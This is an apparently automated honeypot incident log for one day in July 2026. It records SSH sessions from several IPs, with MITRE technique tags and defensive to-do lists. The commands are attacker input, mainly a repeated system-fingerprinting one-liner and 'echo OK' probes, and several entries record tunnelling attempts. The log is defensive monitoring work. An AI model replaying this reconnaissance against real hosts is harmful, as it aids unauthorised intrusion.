### 🔴 HIGH · IR-82d492ecc7c2

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 13:36 |
| **Last Seen** | 2026-07-11 13:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:36:15` | `cowrie.session.connect` |
| `2026-07-11 13:36:15` | `cowrie.client.version` |
| `2026-07-11 13:36:15` | `cowrie.client.kex` |
| `2026-07-11 13:36:17` | `cowrie.login.success` |
| `2026-07-11 13:36:18` | `cowrie.session.params` |
| `2026-07-11 13:36:18` | `cowrie.command.input` |
| `2026-07-11 13:36:18` | `cowrie.command.input` |
| `2026-07-11 13:36:18` | `cowrie.command.input` |
| `2026-07-11 13:36:18` | `cowrie.command.input` |
| `2026-07-11 13:36:18` | `cowrie.command.input` |
| `2026-07-11 13:36:18` | `cowrie.command.success` |
| `2026-07-11 13:36:18` | `cowrie.command.input` |
| `2026-07-11 13:36:18` | `cowrie.command.input` |
| `2026-07-11 13:36:18` | `cowrie.command.input` |
| `2026-07-11 13:36:18` | `cowrie.command.input` |
| `2026-07-11 13:36:19` | `cowrie.log.closed` |
| `2026-07-11 13:36:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec597d8c7b0d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 13:37 |
| **Last Seen** | 2026-07-11 13:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:37:58` | `cowrie.session.connect` |
| `2026-07-11 13:37:59` | `cowrie.client.version` |
| `2026-07-11 13:37:59` | `cowrie.client.kex` |
| `2026-07-11 13:38:00` | `cowrie.login.success` |
| `2026-07-11 13:38:02` | `cowrie.session.params` |
| `2026-07-11 13:38:02` | `cowrie.command.input` |
| `2026-07-11 13:38:02` | `cowrie.command.input` |
| `2026-07-11 13:38:02` | `cowrie.command.input` |
| `2026-07-11 13:38:02` | `cowrie.command.input` |
| `2026-07-11 13:38:02` | `cowrie.command.input` |
| `2026-07-11 13:38:02` | `cowrie.command.success` |
| `2026-07-11 13:38:02` | `cowrie.command.input` |
| `2026-07-11 13:38:02` | `cowrie.command.input` |
| `2026-07-11 13:38:02` | `cowrie.command.input` |
| `2026-07-11 13:38:02` | `cowrie.command.input` |
| `2026-07-11 13:38:03` | `cowrie.log.closed` |
| `2026-07-11 13:38:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4be4575dc06f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 13:39 |
| **Last Seen** | 2026-07-11 13:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:39:40` | `cowrie.session.connect` |
| `2026-07-11 13:39:41` | `cowrie.client.version` |
| `2026-07-11 13:39:41` | `cowrie.client.kex` |
| `2026-07-11 13:39:43` | `cowrie.login.success` |
| `2026-07-11 13:39:45` | `cowrie.session.params` |
| `2026-07-11 13:39:45` | `cowrie.command.input` |
| `2026-07-11 13:39:45` | `cowrie.command.input` |
| `2026-07-11 13:39:45` | `cowrie.command.input` |
| `2026-07-11 13:39:45` | `cowrie.command.input` |
| `2026-07-11 13:39:45` | `cowrie.command.input` |
| `2026-07-11 13:39:45` | `cowrie.command.success` |
| `2026-07-11 13:39:45` | `cowrie.command.input` |
| `2026-07-11 13:39:45` | `cowrie.command.input` |
| `2026-07-11 13:39:45` | `cowrie.command.input` |
| `2026-07-11 13:39:45` | `cowrie.command.input` |
| `2026-07-11 13:39:45` | `cowrie.log.closed` |
| `2026-07-11 13:39:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34f920c3f4e9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 13:41 |
| **Last Seen** | 2026-07-11 13:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:41:23` | `cowrie.session.connect` |
| `2026-07-11 13:41:23` | `cowrie.client.version` |
| `2026-07-11 13:41:23` | `cowrie.client.kex` |
| `2026-07-11 13:41:25` | `cowrie.login.success` |
| `2026-07-11 13:41:27` | `cowrie.session.params` |
| `2026-07-11 13:41:27` | `cowrie.command.input` |
| `2026-07-11 13:41:27` | `cowrie.command.input` |
| `2026-07-11 13:41:27` | `cowrie.command.input` |
| `2026-07-11 13:41:27` | `cowrie.command.input` |
| `2026-07-11 13:41:27` | `cowrie.command.input` |
| `2026-07-11 13:41:27` | `cowrie.command.success` |
| `2026-07-11 13:41:27` | `cowrie.command.input` |
| `2026-07-11 13:41:27` | `cowrie.command.input` |
| `2026-07-11 13:41:27` | `cowrie.command.input` |
| `2026-07-11 13:41:27` | `cowrie.command.input` |
| `2026-07-11 13:41:28` | `cowrie.log.closed` |
| `2026-07-11 13:41:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df5571766288

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 13:43 |
| **Last Seen** | 2026-07-11 13:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:43:04` | `cowrie.session.connect` |
| `2026-07-11 13:43:04` | `cowrie.client.version` |
| `2026-07-11 13:43:04` | `cowrie.client.kex` |
| `2026-07-11 13:43:06` | `cowrie.login.success` |
| `2026-07-11 13:43:08` | `cowrie.session.params` |
| `2026-07-11 13:43:08` | `cowrie.command.input` |
| `2026-07-11 13:43:08` | `cowrie.command.input` |
| `2026-07-11 13:43:08` | `cowrie.command.input` |
| `2026-07-11 13:43:08` | `cowrie.command.input` |
| `2026-07-11 13:43:08` | `cowrie.command.input` |
| `2026-07-11 13:43:08` | `cowrie.command.success` |
| `2026-07-11 13:43:08` | `cowrie.command.input` |
| `2026-07-11 13:43:08` | `cowrie.command.input` |
| `2026-07-11 13:43:08` | `cowrie.command.input` |
| `2026-07-11 13:43:08` | `cowrie.command.input` |
| `2026-07-11 13:43:09` | `cowrie.log.closed` |
| `2026-07-11 13:43:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72a3a3b4601d

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-11 13:43 |
| **Last Seen** | 2026-07-11 13:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:43:51` | `cowrie.session.connect` |
| `2026-07-11 13:43:51` | `cowrie.client.version` |
| `2026-07-11 13:43:51` | `cowrie.client.kex` |
| `2026-07-11 13:43:55` | `cowrie.login.success` |
| `2026-07-11 13:43:58` | `cowrie.session.params` |
| `2026-07-11 13:43:58` | `cowrie.command.input` |
| `2026-07-11 13:43:59` | `cowrie.log.closed` |
| `2026-07-11 13:43:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-241e0a711638

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 13:44 |
| **Last Seen** | 2026-07-11 13:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:44:50` | `cowrie.session.connect` |
| `2026-07-11 13:44:51` | `cowrie.client.version` |
| `2026-07-11 13:44:51` | `cowrie.client.kex` |
| `2026-07-11 13:44:53` | `cowrie.login.success` |
| `2026-07-11 13:44:55` | `cowrie.session.params` |
| `2026-07-11 13:44:55` | `cowrie.command.input` |
| `2026-07-11 13:44:55` | `cowrie.command.input` |
| `2026-07-11 13:44:55` | `cowrie.command.input` |
| `2026-07-11 13:44:55` | `cowrie.command.input` |
| `2026-07-11 13:44:55` | `cowrie.command.input` |
| `2026-07-11 13:44:55` | `cowrie.command.success` |
| `2026-07-11 13:44:55` | `cowrie.command.input` |
| `2026-07-11 13:44:55` | `cowrie.command.input` |
| `2026-07-11 13:44:55` | `cowrie.command.input` |
| `2026-07-11 13:44:55` | `cowrie.command.input` |
| `2026-07-11 13:44:56` | `cowrie.log.closed` |
| `2026-07-11 13:44:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d35fa294324

| Field | Detail |
|---|---|
| **Source IP** | `203.129.225[.]4` |
| **First Seen** | 2026-07-11 13:45 |
| **Last Seen** | 2026-07-11 13:45 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:45:07` | `cowrie.session.connect` |
| `2026-07-11 13:45:08` | `cowrie.client.version` |
| `2026-07-11 13:45:08` | `cowrie.client.kex` |
| `2026-07-11 13:45:12` | `cowrie.login.success` |
| `2026-07-11 13:45:13` | `cowrie.direct-tcpip.request` |
| `2026-07-11 13:45:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.129.225[.]4` to AbuseIPDB if not already reported
- [ ] Block `203.129.225[.]4` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fadf1e90f2e6

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-11 13:45 |
| **Last Seen** | 2026-07-11 13:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:45:10` | `cowrie.session.connect` |
| `2026-07-11 13:45:10` | `cowrie.client.version` |
| `2026-07-11 13:45:10` | `cowrie.client.kex` |
| `2026-07-11 13:45:10` | `cowrie.login.success` |
| `2026-07-11 13:45:10` | `cowrie.direct-tcpip.request` |
| `2026-07-11 13:45:10` | `cowrie.direct-tcpip.data` |
| `2026-07-11 13:45:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad10b2cb8aa7

| Field | Detail |
|---|---|
| **Source IP** | `47.89.228[.]114` |
| **First Seen** | 2026-07-11 13:45 |
| **Last Seen** | 2026-07-11 13:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:45:18` | `cowrie.session.connect` |
| `2026-07-11 13:45:18` | `cowrie.client.version` |
| `2026-07-11 13:45:18` | `cowrie.client.kex` |
| `2026-07-11 13:45:18` | `cowrie.login.success` |
| `2026-07-11 13:45:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.89.228[.]114` to AbuseIPDB if not already reported
- [ ] Block `47.89.228[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c2edaa75639

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-11 13:45 |
| **Last Seen** | 2026-07-11 13:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:45:19` | `cowrie.session.connect` |
| `2026-07-11 13:45:19` | `cowrie.client.version` |
| `2026-07-11 13:45:19` | `cowrie.client.kex` |
| `2026-07-11 13:45:19` | `cowrie.login.success` |
| `2026-07-11 13:45:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0b47be659e3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 13:46 |
| **Last Seen** | 2026-07-11 13:46 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:46:38` | `cowrie.session.connect` |
| `2026-07-11 13:46:39` | `cowrie.client.version` |
| `2026-07-11 13:46:39` | `cowrie.client.kex` |
| `2026-07-11 13:46:41` | `cowrie.login.success` |
| `2026-07-11 13:46:43` | `cowrie.session.params` |
| `2026-07-11 13:46:43` | `cowrie.command.input` |
| `2026-07-11 13:46:43` | `cowrie.command.input` |
| `2026-07-11 13:46:43` | `cowrie.command.input` |
| `2026-07-11 13:46:43` | `cowrie.command.input` |
| `2026-07-11 13:46:43` | `cowrie.command.input` |
| `2026-07-11 13:46:43` | `cowrie.command.success` |
| `2026-07-11 13:46:43` | `cowrie.command.input` |
| `2026-07-11 13:46:43` | `cowrie.command.input` |
| `2026-07-11 13:46:43` | `cowrie.command.input` |
| `2026-07-11 13:46:43` | `cowrie.command.input` |
| `2026-07-11 13:46:43` | `cowrie.log.closed` |
| `2026-07-11 13:46:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b633db9ec60f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 13:48 |
| **Last Seen** | 2026-07-11 13:48 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:48:26` | `cowrie.session.connect` |
| `2026-07-11 13:48:27` | `cowrie.client.version` |
| `2026-07-11 13:48:27` | `cowrie.client.kex` |
| `2026-07-11 13:48:29` | `cowrie.login.success` |
| `2026-07-11 13:48:31` | `cowrie.session.params` |
| `2026-07-11 13:48:31` | `cowrie.command.input` |
| `2026-07-11 13:48:31` | `cowrie.command.input` |
| `2026-07-11 13:48:31` | `cowrie.command.input` |
| `2026-07-11 13:48:31` | `cowrie.command.input` |
| `2026-07-11 13:48:31` | `cowrie.command.input` |
| `2026-07-11 13:48:31` | `cowrie.command.success` |
| `2026-07-11 13:48:31` | `cowrie.command.input` |
| `2026-07-11 13:48:31` | `cowrie.command.input` |
| `2026-07-11 13:48:31` | `cowrie.command.input` |
| `2026-07-11 13:48:31` | `cowrie.command.input` |
| `2026-07-11 13:48:31` | `cowrie.log.closed` |
| `2026-07-11 13:48:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa1ca700d1a7

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-11 13:54 |
| **Last Seen** | 2026-07-11 13:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:54:03` | `cowrie.session.connect` |
| `2026-07-11 13:54:03` | `cowrie.client.version` |
| `2026-07-11 13:54:03` | `cowrie.client.kex` |
| `2026-07-11 13:54:04` | `cowrie.login.success` |
| `2026-07-11 13:54:04` | `cowrie.direct-tcpip.request` |
| `2026-07-11 13:54:04` | `cowrie.direct-tcpip.data` |
| `2026-07-11 13:54:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fd502376215

| Field | Detail |
|---|---|
| **Source IP** | `60.249.252[.]94` |
| **First Seen** | 2026-07-11 13:55 |
| **Last Seen** | 2026-07-11 13:55 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:55:02` | `cowrie.session.connect` |
| `2026-07-11 13:55:03` | `cowrie.client.version` |
| `2026-07-11 13:55:03` | `cowrie.client.kex` |
| `2026-07-11 13:55:06` | `cowrie.login.success` |
| `2026-07-11 13:55:07` | `cowrie.direct-tcpip.request` |
| `2026-07-11 13:55:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.249.252[.]94` to AbuseIPDB if not already reported
- [ ] Block `60.249.252[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b97eb73dae9

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-11 13:58 |
| **Last Seen** | 2026-07-11 13:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:58:01` | `cowrie.session.connect` |
| `2026-07-11 13:58:02` | `cowrie.client.version` |
| `2026-07-11 13:58:02` | `cowrie.client.kex` |
| `2026-07-11 13:58:04` | `cowrie.login.success` |
| `2026-07-11 13:58:05` | `cowrie.session.params` |
| `2026-07-11 13:58:05` | `cowrie.command.input` |
| `2026-07-11 13:58:05` | `cowrie.log.closed` |
| `2026-07-11 13:58:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-734804a1e741

| Field | Detail |
|---|---|
| **Source IP** | `220.128.137[.]164` |
| **First Seen** | 2026-07-11 13:58 |
| **Last Seen** | 2026-07-11 13:58 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:58:43` | `cowrie.session.connect` |
| `2026-07-11 13:58:44` | `cowrie.client.version` |
| `2026-07-11 13:58:44` | `cowrie.client.kex` |
| `2026-07-11 13:58:46` | `cowrie.login.success` |
| `2026-07-11 13:58:47` | `cowrie.direct-tcpip.request` |
| `2026-07-11 13:58:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.128.137[.]164` to AbuseIPDB if not already reported
- [ ] Block `220.128.137[.]164` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

